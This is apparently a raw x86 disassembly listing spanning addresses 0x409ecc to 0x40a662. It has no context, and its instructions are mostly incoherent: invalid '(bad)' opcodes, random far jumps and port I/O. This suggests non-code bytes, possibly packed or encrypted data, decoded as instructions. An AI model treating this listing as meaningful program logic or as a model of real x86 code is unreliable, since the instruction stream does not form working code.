  409ecc:	ins    DWORD PTR es:[edi],dx
  409ecd:	xchg   esi,eax
  409ece:	ror    DWORD PTR [edx+0x2d],0xc1
  409ed2:	sbb    al,0x2d
  409ed4:	push   esp
  409ed5:	popa   
  409ed6:	xchg   ebp,eax
  409ed7:	ret    
  409ed8:	rol    DWORD PTR [ecx+esi*1+0x4b],1
  409edc:	rcr    DWORD PTR [edi],cl
  409ede:	dec    edx
  409edf:	cs hlt 
  409ee1:	dec    eax
  409ee2:	push   edi
  409ee3:	lods   al,BYTE PTR ds:[esi]
  409ee4:	add    eax,0xe4b6f3c2
  409ee9:	outs   dx,BYTE PTR ds:[esi]
  409eea:	cli    
  409eeb:	mov    dl,0x27
  409eed:	xchg   edx,eax
  409eee:	jmp    0x39f1:0x4575af9f
  409ef5:	or     al,0x37
  409ef7:	xor    DWORD PTR [esi],esi
  409ef9:	jo     0x409f5c
  409efb:	push   esp
  409efc:	xor    ebx,edx
  409efe:	xchg   ebp,eax
  409eff:	xor    DWORD PTR [edx],edi
  409f01:	mov    ch,ah
  409f03:	push   es
  409f04:	cdq    
  409f05:	adc    eax,DWORD PTR [ebp-0x93cde23]
  409f0b:	add    eax,0xe5f56071
  409f10:	jecxz  0x409ef2
  409f12:	and    eax,0x2359aab6
  409f17:	sbb    eax,0x7e70f60b
  409f1c:	gs pusha 
  409f1e:	fwait
  409f1f:	cmp    BYTE PTR [esp+eax*8+0x4fa627ea],bl
  409f26:	cli    
  409f27:	xchg   esp,eax
  409f28:	lods   al,BYTE PTR ds:[esi]
  409f29:	not    DWORD PTR [ebx]
  409f2b:	push   eax
  409f2c:	or     ah,ah
  409f2e:	jno    0x409ef4
  409f30:	cdq    
  409f31:	mov    DWORD PTR ss:[ebx+0x18bb53f9],esp
  409f38:	enter  0xf3b1,0xa
  409f3c:	ds push ss
  409f3e:	das    
  409f3f:	mov    ?,WORD PTR [edi]
  409f41:	jne    0x409f78
  409f43:	xor    ecx,eax
  409f45:	jge    0x409f86
  409f47:	jne    0x409f2c
  409f49:	mov    ?,esp
  409f4b:	adc    edx,DWORD PTR [ebx+eiz*2+0x1e]
  409f4f:	cmp    ah,BYTE PTR [esi+0x74]
  409f52:	jg     0x409fac
  409f54:	push   ebx
  409f55:	xor    DWORD PTR [eax-0x23],esp
  409f58:	lods   al,BYTE PTR ds:[esi]
  409f59:	dec    edx
  409f5a:	inc    edx
  409f5b:	stos   DWORD PTR es:[edi],eax
  409f5c:	pop    ecx
  409f5d:	mov    edi,0x23a39fda
  409f62:	imul   eax,DWORD PTR [eax+0x34],0x25
  409f66:	retf   0x7486
  409f69:	in     al,0x95
  409f6b:	sub    ebx,DWORD PTR [eax+0x64]
  409f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6f:	into   
  409f70:	jmp    0x999:0xd0fc4239
  409f77:	das    
  409f78:	or     al,0x5f
  409f7a:	les    edi,FWORD PTR [ecx]
  409f7c:	add    ah,BYTE PTR [ebp-0x20]
  409f7f:	aam    0xc9
  409f81:	pop    ebp
  409f82:	push   ss
  409f83:	xlat   BYTE PTR ds:[ebx]
  409f84:	pop    ebp
  409f85:	pop    ss
  409f86:	in     eax,0x6c
  409f88:	test   DWORD PTR [ecx],ebp
  409f8a:	jne    0x409f1c
  409f8c:	adc    al,BYTE PTR [esi+0x61]
  409f8f:	or     DWORD PTR [ecx+0xea0242d],eax
  409f95:	add    BYTE PTR [ecx+0x5fb1c4aa],al
  409f9b:	cmp    BYTE PTR [ecx+0x2d],ah
  409f9e:	jg     0x409f55
  409fa0:	jb     0x409f99
  409fa2:	cmp    eax,0x684ba7d9
  409fa7:	loop   0x409f68
  409fa9:	test   BYTE PTR [ebx-0x1bff237c],dh
  409faf:	pminsw mm0,QWORD PTR [ebx]
  409fb2:	shl    DWORD PTR [edi+0x46],1
  409fb5:	daa    
  409fb6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fb8:	imul   ecx,ebp,0x39
  409fbb:	shl    BYTE PTR [ecx-0x79],cl
  409fbe:	mov    esp,0xde22d377
  409fc3:	aam    0xa1
  409fc5:	mov    edi,?
  409fc7:	std    
  409fc8:	xor    eax,0x77c9b56d
  409fcd:	inc    edx
  409fce:	push   ebx
  409fcf:	sbb    BYTE PTR ds:0xc3ae35d,ch
  409fd5:	mov    ecx,0x1baf4980
  409fda:	adc    ch,bl
  409fdc:	fwait
  409fdd:	or     esi,DWORD PTR [esi+0x54]
  409fe0:	jg     0x409f93
  409fe2:	inc    esp
  409fe3:	rcl    BYTE PTR [edx-0x7b8ce9aa],0x91
  409fea:	mov    ds:0x2d8daca6,al
  409fef:	sar    BYTE PTR [edi],1
  409ff1:	xor    BYTE PTR [ebp+ebp*8+0x799f4c46],dh
  409ff8:	imul   edi,DWORD PTR [ebp+0x41bf47f1],0x33
  409fff:	adc    BYTE PTR [ebx+ebp*4+0x732390b6],dl
  40a006:	jo     0x40a017
  40a008:	inc    ebp
  40a009:	in     al,dx
  40a00a:	loopne 0x40a019
  40a00c:	jae    0x40a00b
  40a00e:	cmp    eax,0xc69766b2
  40a013:	mov    bh,0x7c
  40a015:	aam    0xb0
  40a017:	pop    es
  40a018:	pop    es
  40a019:	int    0xe0
  40a01b:	jmp    0x1a2b8a10
  40a020:	push   esi
  40a021:	mov    ebp,0x9aa42818
  40a026:	and    BYTE PTR [ebx+0x37],0x97
  40a02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a02b:	push   edx
  40a02c:	xchg   ecx,eax
  40a02d:	adc    al,BYTE PTR [ebx-0x1e0c1a2d]
  40a033:	scas   eax,DWORD PTR es:[edi]
  40a034:	pop    ebx
  40a035:	adc    DWORD PTR [ecx],ebp
  40a037:	push   edi
  40a038:	sbb    al,0xdf
  40a03a:	mov    edi,0xe5730d88
  40a03f:	mov    ds:0x55f3d17e,eax
  40a044:	add    ebx,DWORD PTR [esi-0x24]
  40a047:	mov    al,ds:0xa06907ed
  40a04c:	call   FWORD PTR [ebp+edi*2-0x67]
  40a050:	sbb    BYTE PTR [ecx-0x54],cl
  40a053:	imul   esi
  40a055:	in     eax,0x9b
  40a057:	test   eax,0x1c23c982
  40a05c:	lods   al,BYTE PTR ds:[esi]
  40a05d:	mul    BYTE PTR [eax]
  40a05f:	xchg   esi,eax
  40a060:	mov    eax,0xe9a1a9fc
  40a065:	xchg   edi,eax
  40a066:	movd   mm2,DWORD PTR ds:0x4df8ceec
  40a06d:	mov    al,ds:0xab54bd99
  40a072:	sar    DWORD PTR [eax+0x1a],1
  40a075:	push   edi
  40a076:	dec    edx
  40a077:	fistp  WORD PTR [esi]
  40a079:	add    eax,DWORD PTR [esi-0x6]
  40a07c:	or     bh,BYTE PTR [esi+0x7f]
  40a07f:	add    edx,DWORD PTR [ebp+0x4c]
  40a082:	xlat   BYTE PTR ds:[ebx]
  40a083:	cld    
  40a084:	out    0x8c,eax
  40a086:	pop    ecx
  40a087:	scas   eax,DWORD PTR es:[edi]
  40a088:	call   0x9e7b:0xa09f9d47
  40a08f:	xor    BYTE PTR [ecx],0x61
  40a092:	xor    eax,0x7b16c240
  40a097:	imul   ecx,DWORD PTR [ecx],0x1d3d6a71
  40a09d:	sbb    BYTE PTR ds:0x94d998ff,ch
  40a0a3:	sub    edi,DWORD PTR [edi-0x5d]
  40a0a6:	das    
  40a0a7:	push   0x213fa36a
  40a0ac:	lock and dh,dl
  40a0af:	push   ecx
  40a0b0:	sbb    DWORD PTR [ebx],ebx
  40a0b2:	cdq    
  40a0b3:	outs   dx,BYTE PTR ds:[esi]
  40a0b4:	in     al,0xee
  40a0b6:	jmp    0x2950:0xfd2c9852
  40a0bd:	pop    eax
  40a0be:	ror    DWORD PTR [edi],0x3d
  40a0c1:	cmc    
  40a0c2:	mov    bh,0xe5
  40a0c4:	xor    BYTE PTR [ebp-0x79],dh
  40a0c7:	retf   0x48d3
  40a0ca:	fild   QWORD PTR [edx]
  40a0cc:	retf   0xabab
  40a0cf:	repz sub eax,0xa256950a
  40a0d5:	push   ds
  40a0d6:	push   es
  40a0d7:	cwde   
  40a0d8:	dec    edi
  40a0d9:	jb     0x40a11a
  40a0db:	or     ch,al
  40a0dd:	loope  0x40a075
  40a0df:	addr16 in eax,dx
  40a0e1:	(bad)  
  40a0e2:	retf   
  40a0e3:	and    DWORD PTR [eax+ecx*1+0x2a],eax
  40a0e7:	stc    
  40a0e8:	dec    esp
  40a0e9:	jae    0x40a0cb
  40a0eb:	es cmc 
  40a0ed:	mov    ds:0x6e445ee1,eax
  40a0f2:	xchg   ecx,eax
  40a0f3:	jnp    0x40a122
  40a0f5:	dec    edx
  40a0f6:	inc    ecx
  40a0f7:	xor    ebx,DWORD PTR [eax-0x349912e]
  40a0fd:	ret    0x4dc9
  40a100:	imul   ecx,DWORD PTR [edi],0x649b706c
  40a106:	xchg   bl,cl
  40a108:	fistp  QWORD PTR [esi-0x574ae711]
  40a10e:	imul   ecx,DWORD PTR [esi],0x9d8b0be9
  40a114:	fadd   DWORD PTR [eax+ebp*8-0x8]
  40a118:	jge    0x40a0b3
  40a11a:	mov    edx,0x6673d1ad
  40a11f:	push   0xbd1692e3
  40a124:	inc    esi
  40a125:	pop    eax
  40a126:	mov    ebp,DWORD PTR [ebx-0x61174]
  40a12c:	adc    edx,DWORD PTR [ebx-0x41aa599d]
  40a132:	(bad)
  40a135:	pop    edx
  40a136:	xchg   ebp,eax
  40a137:	sbb    ch,BYTE PTR [ecx+0x19672e3]
  40a13d:	or     al,0x17
  40a13f:	test   dl,bh
  40a141:	push   eax
  40a142:	xchg   ebx,eax
  40a143:	dec    eax
  40a144:	mov    ecx,DWORD PTR [edx]
  40a146:	mov    bl,0x26
  40a148:	call   0x691d:0xf3ac53f9
  40a14f:	mov    ch,0xab
  40a151:	mov    eax,ds:0xf20639cb
  40a156:	sbb    cl,BYTE PTR [edi]
  40a158:	push   es
  40a159:	xchg   DWORD PTR [ebp+0x2d],ebx
  40a15c:	stos   BYTE PTR es:[edi],al
  40a15d:	pop    es
  40a15e:	in     al,dx
  40a15f:	push   cs
  40a160:	push   esp
  40a161:	push   0xffffffaa
  40a163:	in     al,0xa4
  40a165:	fild   DWORD PTR [ecx]
  40a167:	pop    ecx
  40a168:	test   BYTE PTR [eax],al
  40a16a:	inc    eax
  40a16b:	xchg   edx,eax
  40a16c:	lea    esi,gs:[bx+di-0x7d28]
  40a172:	in     al,dx
  40a173:	inc    ebx
  40a174:	mov    ch,0x88
  40a176:	mov    cl,0x5e
  40a178:	aas    
  40a179:	out    0x2f,eax
  40a17b:	cs shl edx,0xc7
  40a17f:	and    DWORD PTR [eax],ebx
  40a181:	cdq    
  40a182:	in     al,0x9c
  40a184:	add    eax,0x68d44913
  40a189:	sti    
  40a18a:	jge    0x40a110
  40a18c:	gs mov ah,0xef
  40a18f:	sar    BYTE PTR [edi+0x80b2811],cl
  40a195:	jb     0x40a138
  40a197:	push   ecx
  40a198:	mov    esp,0x334386c3
  40a19d:	inc    eax
  40a19e:	in     eax,dx
  40a19f:	jmp    0x40a21a
  40a1a1:	push   esp
  40a1a2:	sub    DWORD PTR [esi-0x4975ebfd],eax
  40a1a8:	sbb    ah,BYTE PTR [ecx]
  40a1aa:	jmp    0x1576:0x332f125c
  40a1b1:	popf   
  40a1b2:	cmp    edi,esi
  40a1b4:	imul   ecx,DWORD PTR [ecx+eiz*1],0xffffff94
  40a1b8:	jne    0x40a1a4
  40a1ba:	dec    ecx
  40a1bb:	add    ebp,esp
  40a1bd:	popa   
  40a1be:	out    dx,eax
  40a1bf:	push   esp
  40a1c0:	out    0x50,eax
  40a1c2:	pop    es
  40a1c3:	aaa    
  40a1c4:	arpl   WORD PTR [edx+0x48],si
  40a1c7:	adc    eax,0x920ee7f1
  40a1cc:	ds aaa 
  40a1ce:	fucomp st(3)
  40a1d0:	test   eax,0x17a74377
  40a1d5:	adc    DWORD PTR [eax+0x7223f50f],ebp
  40a1db:	fs push cs
  40a1dd:	xchg   esi,eax
  40a1de:	adc    dh,BYTE PTR [ebp+0x179d8723]
  40a1e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e5:	jg     0x40a1c0
  40a1e7:	mov    ds:0x8bac8c21,eax
  40a1ec:	ss mov edi,0x31000b84
  40a1f2:	out    dx,al
  40a1f3:	jl     0x40a1f9
  40a1f5:	lahf   
  40a1f6:	push   0x358e0956
  40a1fb:	xchg   edi,eax
  40a1fc:	jmp    DWORD PTR [ebx+0x5bc148bb]
  40a202:	xchg   BYTE PTR [eax-0x32eadf1d],dl
  40a208:	dec    esp
  40a209:	xor    dl,ch
  40a20b:	lods   eax,DWORD PTR ds:[esi]
  40a20c:	mov    ah,0xeb
  40a20e:	repnz jecxz 0x40a241
  40a211:	inc    ecx
  40a212:	aaa    
  40a213:	xor    eax,0xe9c9d84b
  40a218:	jle    0x40a1ed
  40a21a:	sbb    bh,0x66
  40a21d:	mov    edx,0xba835da3
  40a222:	out    0x24,al
  40a224:	leave  
  40a225:	or     eax,0xbe203e59
  40a22a:	add    edx,DWORD PTR [edx]
  40a22c:	or     ebp,ebp
  40a22e:	mov    ds:0x61028064,al
  40a233:	and    esp,0xe6fe723d
  40a239:	into   
  40a23a:	or     BYTE PTR [esi-0x49a64898],ch
  40a240:	mov    edi,0xb30246f4
  40a245:	pop    eax
  40a246:	xchg   edx,eax
  40a247:	and    BYTE PTR [edx],0x7b
  40a24a:	test   DWORD PTR [esi],esp
  40a24c:	push   edi
  40a24d:	cs mov esi,0xe04a58c6
  40a253:	and    al,0x5f
  40a255:	cmp    eax,0xc108cc2a
  40a25a:	test   DWORD PTR [edi+0x366f7f48],eax
  40a260:	sub    bl,BYTE PTR ds:0xf88b406d
  40a266:	pminub mm6,QWORD PTR [esi+0x66]
  40a26a:	push   esi
  40a26b:	mov    dl,dh
  40a26d:	in     eax,dx
  40a26e:	or     DWORD PTR [edx+0x5c],ecx
  40a271:	xor    al,0xa5
  40a273:	cmc    
  40a274:	in     eax,0x99
  40a276:	xchg   cl,dh
  40a278:	and    eax,0x10e7e398
  40a27d:	xchg   edi,eax
  40a27e:	adc    eax,DWORD PTR gs:[eax-0x511d258f]
  40a285:	cli    
  40a286:	xor    DWORD PTR [eax+0x6497ce0e],edi
  40a28c:	es dec edx
  40a28e:	push   0xffffff9d
  40a290:	gs push cs
  40a292:	pop    eax
  40a293:	dec    edi
  40a294:	sbb    DWORD PTR [ebx],edi
  40a296:	ret    0x2f62
  40a299:	xor    BYTE PTR [eax-0x5d],ch
  40a29c:	ret    
  40a29d:	les    edi,FWORD PTR [esi-0x60]
  40a2a0:	test   BYTE PTR [ecx],ah
  40a2a2:	jns    0x40a309
  40a2a4:	in     eax,0x74
  40a2a6:	int3   
  40a2a7:	add    edx,eax
  40a2a9:	push   edx
  40a2aa:	xor    esp,DWORD PTR [ecx-0x41]
  40a2ad:	inc    ecx
  40a2ae:	imul   ecx,DWORD PTR [ecx+0x66fa1640],0x996841cd
  40a2b8:	xchg   BYTE PTR [ebx],ch
  40a2ba:	clc    
  40a2bb:	sub    eax,0xb8a2c23f
  40a2c0:	push   edi
  40a2c1:	popa   
  40a2c2:	addr16 dec esp
  40a2c4:	daa    
  40a2c5:	sub    eax,0xabb9a38c
  40a2ca:	pop    edx
  40a2cb:	lea    esi,[edx+0x51]
  40a2ce:	outs   dx,DWORD PTR ds:[esi]
  40a2cf:	sbb    BYTE PTR [ebp+0x2],bl
  40a2d2:	jl     0x40a316
  40a2d4:	inc    edx
  40a2d5:	lods   al,BYTE PTR ds:[esi]
  40a2d6:	pop    esi
  40a2d7:	iret   
  40a2d8:	rol    BYTE PTR [edi+0x4c],cl
  40a2db:	adc    ebx,eax
  40a2dd:	stc    
  40a2de:	ss (bad) 
  40a2e0:	pop    ebp
  40a2e1:	adc    eax,0x40c4ac04
  40a2e6:	sub    BYTE PTR [esi+0x65b77e7f],ah
  40a2ec:	push   edi
  40a2ed:	mov    al,ds:0xe19305f
  40a2f2:	loop   0x40a2c9
  40a2f4:	sbb    cl,BYTE PTR [ebx+esi*2]
  40a2f7:	mov    DWORD PTR [eax+0x35],esi
  40a2fa:	mov    bh,ch
  40a2fc:	mov    edi,0x49bb6cb8
  40a301:	fwait
  40a302:	(bad)  
  40a304:	jnp    0x40a317
  40a306:	ds cs mov bl,0xac
  40a30a:	xor    eax,0xd4aa2976
  40a30f:	ret    0x5b33
  40a312:	add    eax,0x95d3e303
  40a317:	mov    ecx,0x1331d3cf
  40a31c:	xor    esp,esi
  40a31e:	cmp    al,0x6a
  40a320:	sbb    BYTE PTR [edx-0x28cbb08e],0xcb
  40a327:	aas    
  40a328:	int    0x8d
  40a32a:	rcr    BYTE PTR [ecx-0x6a],cl
  40a32d:	pop    ebx
  40a32e:	mov    edx,0x84c5c153
  40a333:	(bad)  
  40a334:	xchg   ebp,eax
  40a335:	jl     0x40a323
  40a337:	push   0x66f02075
  40a33c:	push   edx
  40a33d:	xor    DWORD PTR [esi+edx*2],esi
  40a340:	xchg   ebp,eax
  40a341:	cwde   
  40a342:	add    BYTE PTR [ebx+edx*2-0x27],cl
  40a346:	adc    ebp,DWORD PTR [edi+0x42]
  40a349:	xor    BYTE PTR [esi+0x2b],al
  40a34c:	push   cs
  40a34d:	mov    ebx,eax
  40a34f:	add    DWORD PTR [edi],0x79787d55
  40a355:	sbb    ecx,DWORD PTR [ebx+0x12]
  40a358:	jecxz  0x40a376
  40a35a:	ret    0x9b7a
  40a35d:	push   edx
  40a35e:	les    ebp,FWORD PTR [ebx-0x18]
  40a361:	jae    0x40a307
  40a363:	out    dx,al
  40a364:	js     0x40a37d
  40a366:	fs aam 0x57
  40a369:	fld    TBYTE PTR [ebp-0x72]
  40a36c:	jle    0x40a305
  40a36e:	adc    edi,DWORD PTR [ecx-0x17]
  40a371:	loope  0x40a3dd
  40a373:	fs mov dh,cl
  40a376:	mov    BYTE PTR [edx-0x4e],dl
  40a379:	push   esp
  40a37a:	add    al,0x1e
  40a37c:	nop
  40a37d:	adc    esp,DWORD PTR [esi-0x587a3d8]
  40a383:	data16 mov ch,0x1a
  40a386:	aam    0x33
  40a388:	jno    0x40a30e
  40a38a:	jp     0x40a3a9
  40a38c:	add    al,0x87
  40a38e:	mov    ds,WORD PTR [ebx-0x2ce30c09]
  40a394:	xchg   esp,eax
  40a395:	mov    ebx,0x7e1f01da
  40a39a:	and    al,dl
  40a39c:	in     eax,dx
  40a39d:	add    ecx,esi
  40a39f:	cmp    eax,0xecd53024
  40a3a4:	adc    al,0x52
  40a3a6:	push   esi
  40a3a7:	adc    BYTE PTR [eax],0x70
  40a3aa:	jne    0x40a3c2
  40a3ac:	pop    ds
  40a3ad:	pusha  
  40a3ae:	xchg   DWORD PTR [esp+esi*1-0x40],ebx
  40a3b2:	push   ebp
  40a3b3:	dec    ebp
  40a3b4:	xchg   BYTE PTR [ecx],dl
  40a3b6:	push   cs
  40a3b7:	pop    eax
  40a3b8:	adc    BYTE PTR [edx+0x147bf804],bl
  40a3be:	xor    al,0x49
  40a3c0:	mov    esi,ecx
  40a3c2:	inc    ebp
  40a3c3:	(bad)  
  40a3c4:	pop    eax
  40a3c5:	sbb    ecx,ebx
  40a3c7:	mov    ebx,0x68b47a03
  40a3cc:	lahf   
  40a3cd:	inc    ebx
  40a3ce:	or     ah,cl
  40a3d0:	inc    ebp
  40a3d1:	or     DWORD PTR [esi],0x2ccb2492
  40a3d7:	sub    cl,ah
  40a3d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3da:	jecxz  0x40a43f
  40a3dc:	or     BYTE PTR ss:[ecx],al
  40a3df:	xchg   esp,eax
  40a3e0:	inc    ebp
  40a3e1:	xchg   DWORD PTR [ecx],edi
  40a3e3:	jmp    0x495:0xdb9290cc
  40a3ea:	adc    edi,DWORD PTR [ebx+0x2a91a076]
  40a3f0:	neg    BYTE PTR [ebx-0x48]
  40a3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3f4:	or     ebp,eax
  40a3f6:	add    BYTE PTR [ecx],bl
  40a3f8:	or     al,0x6c
  40a3fa:	mov    ?,esp
  40a3fc:	repnz retf 0x8649
  40a400:	jl     0x40a404
  40a402:	jne    0x40a45c
  40a404:	call   0x3a73:0x858c48d1
  40a40b:	mov    bh,0x2f
  40a40d:	mov    ecx,0x6837ee5d
  40a412:	fsubr  DWORD PTR [edi-0x76b94dee]
  40a418:	adc    al,0x22
  40a41a:	xchg   edx,eax
  40a41b:	fsub   DWORD PTR [ecx+0x51]
  40a41e:	jae    0x40a427
  40a420:	andnps xmm3,XMMWORD PTR [esi-0x6b]
  40a424:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a426:	jne    0x40a3bd
  40a428:	sbb    eax,0xccdfc749
  40a42d:	out    0x32,eax
  40a42f:	dec    ecx
  40a430:	aam    0x5a
  40a432:	fisub  DWORD PTR [ebx+0x3a]
  40a435:	pop    esi
  40a436:	enter  0xcbfa,0xb0
  40a43a:	and    BYTE PTR [eax],0xee
  40a43d:	pop    ds
  40a43e:	dec    edi
  40a43f:	aas    
  40a440:	fnstcw WORD PTR ds:0x4b690355
  40a446:	les    edx,FWORD PTR [edi-0x12]
  40a449:	adc    eax,0x45c547e0
  40a44e:	leave  
  40a44f:	and    BYTE PTR [eax+0x41db7f5f],ah
  40a455:	cmp    al,0x1b
  40a457:	lods   al,BYTE PTR ds:[esi]
  40a458:	jle    0x40a4cc
  40a45a:	adc    eax,0x953807b4
  40a45f:	and    al,0x42
  40a461:	mov    WORD PTR [ebp-0x24],ss
  40a464:	xor    edx,esp
  40a466:	add    bl,BYTE PTR [edi]
  40a468:	mov    dl,0xfe
  40a46a:	loope  0x40a488
  40a46c:	and    ecx,ebp
  40a46e:	sar    DWORD PTR [esi-0x4a],1
  40a471:	xlat   BYTE PTR ds:[ebx]
  40a472:	and    ecx,DWORD PTR [ecx+0x77dc4877]
  40a478:	push   esp
  40a479:	xchg   edx,eax
  40a47a:	pop    edx
  40a47b:	popa   
  40a47c:	inc    esi
  40a47d:	inc    ebx
  40a47e:	cmp    eax,0x3751cbd3
  40a483:	cmp    BYTE PTR [edi+0x71],cl
  40a486:	inc    ecx
  40a487:	ds sub eax,ecx
  40a48a:	push   ss
  40a48b:	fldcw  WORD PTR [esi-0x27]
  40a48e:	xchg   BYTE PTR [esi+0x71],al
  40a491:	shl    DWORD PTR [edi],cl
  40a493:	lock cwde 
  40a495:	popf   
  40a496:	and    cl,cl
  40a498:	hlt    
  40a499:	jbe    0x40a446
  40a49b:	adc    eax,0xcf0be972
  40a4a0:	cmp    al,0xd7
  40a4a2:	test   al,0x65
  40a4a4:	sbb    BYTE PTR [si],bh
  40a4a7:	xor    dl,BYTE PTR [esi+0x15]
  40a4aa:	jne    0x40a4f5
  40a4ac:	xor    al,0xd5
  40a4ae:	push   ecx
  40a4af:	into   
  40a4b0:	loopne 0x40a447
  40a4b2:	inc    BYTE PTR [eax+ebp*8-0x25]
  40a4b6:	xor    ebx,ebp
  40a4b8:	push   edi
  40a4b9:	add    edx,ebp
  40a4bb:	jmp    0x8993990e
  40a4c0:	nop
  40a4c1:	bound  ebx,QWORD PTR [esi+0x1b]
  40a4c4:	pushf  
  40a4c5:	das    
  40a4c6:	adc    DWORD PTR [esi],esi
  40a4c8:	(bad)  
  40a4c9:	jg     0x40a501
  40a4cb:	push   ebx
  40a4cc:	in     eax,0x4c
  40a4ce:	xor    ah,BYTE PTR [edi-0x52]
  40a4d1:	bound  edi,QWORD PTR [eax]
  40a4d3:	and    al,0x8c
  40a4d5:	div    esp
  40a4d7:	xor    dl,cl
  40a4d9:	sbb    eax,0x4b6e443c
  40a4de:	(bad)  
  40a4df:	and    ebp,edi
  40a4e1:	ret    0x98fd
  40a4e4:	rcl    DWORD PTR fs:[eax+esi*8],1
  40a4e8:	jle    0x40a565
  40a4ea:	and    esi,DWORD PTR [edx+0x66]
  40a4ed:	ins    DWORD PTR es:[edi],dx
  40a4ee:	sub    eax,0x5de64af3
  40a4f3:	add    al,0x6f
  40a4f5:	(bad)  
  40a4f6:	sub    ebx,ebx
  40a4f8:	inc    ebp
  40a4f9:	adc    eax,0x7f4a8559
  40a4fe:	sahf   
  40a4ff:	retf   0xf8e3
  40a502:	clc    
  40a503:	fstp   QWORD PTR [ebx+0x45814f0f]
  40a509:	jecxz  0x40a565
  40a50b:	out    0x82,eax
  40a50d:	ins    DWORD PTR es:[edi],dx
  40a50e:	pusha  
  40a50f:	mov    bl,0xa0
  40a511:	outs   dx,DWORD PTR ds:[esi]
  40a512:	ins    WORD PTR es:[edi],dx
  40a514:	mov    ch,0xc8
  40a516:	mov    ebx,eax
  40a518:	jge    0x40a4c9
  40a51a:	mov    edi,0x721ef37b
  40a51f:	or     DWORD PTR [edi],0xcedc7f67
  40a525:	shl    ah,1
  40a527:	add    DWORD PTR [ebx+0x19],ebx
  40a52a:	inc    edi
  40a52b:	pushf  
  40a52c:	mov    ah,BYTE PTR [ebx-0x26]
  40a52f:	sub    al,0x69
  40a531:	mov    ebx,0xf7c8bdd8
  40a536:	jle    0x40a562
  40a538:	and    ch,ah
  40a53a:	sub    BYTE PTR [ecx-0x3e1ec15a],al
  40a540:	cmp    BYTE PTR [edx+0x71],cl
  40a543:	push   esi
  40a544:	scas   al,BYTE PTR es:[edi]
  40a545:	arpl   WORD PTR [edx+ecx*2-0x18],ax
  40a549:	xor    edi,DWORD PTR [eax-0x50]
  40a54c:	out    0x36,al
  40a54e:	pushf  
  40a54f:	mov    dl,0xa8
  40a551:	dec    edi
  40a552:	scas   al,BYTE PTR es:[edi]
  40a553:	cli    
  40a554:	xor    dh,dl
  40a556:	js     0x40a5be
  40a558:	jmp    0x13ff:0x69ad2566
  40a55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a560:	js     0x40a522
  40a562:	push   ebx
  40a563:	pop    ds
  40a564:	mov    ?,WORD PTR [edi-0x1334fba5]
  40a56a:	and    BYTE PTR [ecx+0x68],0x9a
  40a56e:	sbb    dh,BYTE PTR [ebx+0x1e547ace]
  40a574:	add    al,0x91
  40a576:	int3   
  40a577:	or     eax,0x608cfe56
  40a57c:	add    BYTE PTR [edx-0x6f9326ab],ah
  40a582:	int3   
  40a583:	ds mov dh,0x69
  40a586:	xchg   BYTE PTR fs:[ebx],al
  40a589:	push   edx
  40a58a:	out    dx,eax
  40a58b:	sub    DWORD PTR [edi+0x14],ebx
  40a58e:	jne    0x40a5e8
  40a590:	push   0x26d16630
  40a595:	mov    edx,0xe67db205
  40a59a:	inc    esi
  40a59b:	ins    BYTE PTR es:[edi],dx
  40a59c:	ins    BYTE PTR es:[edi],dx
  40a59d:	sahf   
  40a59e:	jb     0x40a595
  40a5a0:	xchg   ebx,eax
  40a5a1:	sub    eax,0x7e0f4517
  40a5a6:	cmp    al,0x30
  40a5a8:	mov    ch,0xa9
  40a5aa:	xor    DWORD PTR [ebx-0x6e],ecx
  40a5ad:	cs in  al,0x28
  40a5b0:	sbb    BYTE PTR ds:0x5de126de,ah
  40a5b6:	fisttp WORD PTR [edi+0x6fe0fca0]
  40a5bc:	mov    edx,0x33664f5a
  40a5c1:	mov    cl,0x2a
  40a5c3:	cmp    al,0x52
  40a5c5:	xchg   BYTE PTR [ecx],cl
  40a5c7:	or     ah,ah
  40a5c9:	add    eax,0x9856bd28
  40a5ce:	cs sub cl,dh
  40a5d1:	mov    ah,ch
  40a5d3:	test   al,0x8d
  40a5d5:	cmp    bl,BYTE PTR [eax+0x23]
  40a5d8:	push   cs
  40a5d9:	add    al,0xfa
  40a5db:	fist   DWORD PTR [edx+0x34]
  40a5de:	and    esp,DWORD PTR ds:0xfda1d79b
  40a5e4:	pop    DWORD PTR [edx-0x699d47fd]
  40a5ea:	fdivr  QWORD PTR [edi+0x35058e36]
  40a5f0:	add    cl,BYTE PTR [ecx+0x39]
  40a5f3:	push   eax
  40a5f4:	fcom   QWORD PTR [ebx]
  40a5f6:	mov    ch,0xb5
  40a5f8:	inc    eax
  40a5f9:	add    al,0xea
  40a5fb:	aaa    
  40a5fc:	dec    ecx
  40a5fd:	push   edx
  40a5fe:	adc    BYTE PTR [ebx],ch
  40a600:	or     al,0xad
  40a602:	and    ebp,DWORD PTR [ebx]
  40a604:	ret    
  40a605:	add    cl,BYTE PTR [ebp+ebp*8-0x775477e2]
  40a60c:	inc    esp
  40a60d:	push   esp
  40a60e:	dec    esi
  40a60f:	mov    esi,0x630db666
  40a614:	les    esp,FWORD PTR [ebx-0x8d10b88]
  40a61a:	mov    esp,0xfb20e444
  40a61f:	ja     0x40a5fd
  40a621:	int    0xc0
  40a623:	pushf  
  40a624:	inc    esp
  40a625:	mov    cl,BYTE PTR [eax+0x68]
  40a628:	loope  0x40a67f
  40a62a:	test   eax,0xdf447052
  40a62f:	or     dl,BYTE PTR [ebp+0x31]
  40a632:	push   esp
  40a633:	mov    ch,0xff
  40a635:	mov    esi,0x3b66b913
  40a63a:	je     0x40a622
  40a63c:	dec    ebp
  40a63d:	mov    cl,0x4f
  40a63f:	(bad)  
  40a641:	or     DWORD PTR [eax],ebx
  40a643:	out    0x1b,eax
  40a645:	mov    WORD PTR fs:[ebx],?
  40a648:	push   ebx
  40a649:	cmc    
  40a64a:	mov    ebp,0x74761e1b
  40a64f:	jl     0x40a5ee
  40a651:	sub    esi,edx
  40a653:	cmp    al,ah
  40a655:	dec    ebp
  40a656:	adc    esp,eax
  40a658:	adc    DWORD PTR [ecx-0x43],esi
  40a65b:	mov    eax,ds:0x867216f
  40a660:	cmp    al,0xd3
  40a662:	fstp   TBYTE PTR [edi+ebp*1]
